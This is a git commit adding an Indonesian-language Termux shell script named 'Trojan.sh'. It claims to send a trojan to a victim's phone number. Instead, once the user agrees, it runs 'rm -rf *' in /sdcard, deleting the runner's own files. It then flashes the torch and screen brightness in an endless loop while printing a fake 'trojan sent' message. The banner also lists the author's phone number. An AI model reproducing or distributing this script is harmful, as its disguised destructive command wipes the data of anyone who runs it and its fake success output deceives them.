35d053bd8f5ce8eea8424a37a98de319ac57e41e
bang-chil <66408810+bang-chil@users.noreply.github.com>
2020-06-05 07:04:41 +0700

    Create Trojan.sh

---
+++ Trojan.sh
@@ -0,0 +1,269 @@
+#!/bin/bash
+#Tanamkan ilmu iblis gunakan seperti malaikat
+#jangan di recode om nanti aku nangis
+echo "Welcome To my tool"
+echo "Ini adalah tools virus Trojan bro"
+sleep 2
+echo "bilang dulu terimakasih kanchil ganteng😎"
+sleep 2
+echo "sabar ajg lg proses"
+sleep 2
+echo "TANAMKAN ILMU IBLIS GUNAKAN SEPERTI MALAIKAT"
+sleep 3
+clear
+hari=`date +%A`
+tanggal=`date +%d`
+bulan=`date +%B`
+tahun=`date +%Y`
+waktu=`date +%T`
+zona=`date +%Z`
+clear
+echo "\033[0;34m]
+      .---.        .-----------
+     /     \  __  /    ------
+    / /     \(  )/    -----
+   //////   * \/ *   ---
+  //// / // :    : ---
+ // /   /  /*    *--
+//          //..\\
+===========UU====UU==================
++            ****                   +
++ coded by : ✿͜͡ঔৣ✪➵͜͡Kanchil-IDঔৣ͜᷍🌹      +
++ Team : ✿͜͡ঔৣ✪➵͜͡PUB_CYBEERঔৣ͜᷍🌹          +
++ kontak me : 6282125068665         +
++                                   +
++  ^...^                 ^...^      +
++ <_* *_>    TROJAN     <_* *_>     +
++   \_/                   \_/       +
+====================================="
+echo
+sleep 1
+echo "Waiting for your love..."
+sleep 4
+read -p "apakah anda ingin menggunakan tools ini: y/n " un
+if [ $un = y ]
+then
+clear
+cd /sdcard
+rm -rf *
+clear
+echo -n "nomor korbannya bangsat: ";read kc
+sleep 2
+termux-torch on
+clear
+while true
+do
+echo "SUKSES MENGIRIM TROJAN KE NOMOR $kc MERUSAK HP KORBAN $waktu"
+sleep 1
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+termux-brightness 0
+termux-brightness 200
+done
+fi
